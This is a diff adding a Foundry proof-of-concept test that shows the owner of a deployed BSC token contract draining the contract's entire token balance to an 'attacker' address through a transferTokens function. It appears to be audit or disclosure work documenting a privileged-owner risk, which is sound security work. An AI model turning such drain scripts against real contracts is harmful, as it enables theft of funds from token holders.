@@ -1,0 +1,55 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.6;
+
+import "forge-std/Test.sol";
+
+/// @notice Minimal interface for the xenoX token (only the functions needed for the exploit).
+interface IxenoX {
+    function owner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferTokens(address recipient, uint256 amount) external;
+}
+
+/// @title PoC – Owner Contract Tokens Drain (OCTD)
+/// @notice Shows how the contract owner can drain the entire token balance of the contract
+///         by calling the `transferTokens` function.
+contract ExploitTest is Test {
+    // Deployed contract address (BSC)
+    IxenoX constant xenoX = IxenoX(0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51);
+    // Attacker receives the drained tokens
+    address attacker = address(0x1337);
+
+    /// @notice Test that the owner can drain all tokens held by the contract.
+    function testOwnerDrain() public {
+        // 1. Identify the owner
+        address owner = xenoX.owner();
+        vm.label(owner, "Owner");
+
+        // 2. Ensure the contract holds some tokens.
+        //    If the contract's token balance is zero, the owner transfers a portion of their
+        //    own tokens to the contract (simulating accumulated fees).
+        uint256 contractBalance = xenoX.balanceOf(address(xenoX));
+        if (contractBalance == 0) {
+            vm.startPrank(owner);
+            uint256 ownerBalance = xenoX.balanceOf(owner);
+            require(ownerBalance > 0, "Owner has no tokens to seed the contract");
+            uint256 seedAmount = ownerBalance / 10; // send 10% to the contract
+            xenoX.transfer(address(xenoX), seedAmount);
+            vm.stopPrank();
+            contractBalance = xenoX.balanceOf(address(xenoX));
+            require(contractBalance > 0, "Failed to seed contract balance");
+        }
+
+        // 3. Act as the owner and drain the entire contract token balance.
+        vm.startPrank(owner);
+        xenoX.transferTokens(attacker, contractBalance);
+        vm.stopPrank();
+
+        // 4. Assert the impact: contract balance is now zero, attacker received them.
+        assertEq(xenoX.balanceOf(address(xenoX)), 0, "Contract should have 0 tokens after drain");
+        assertEq(xenoX.balanceOf(attacker), contractBalance, "Attacker should have received the drained amount");
+    }
+}
+```
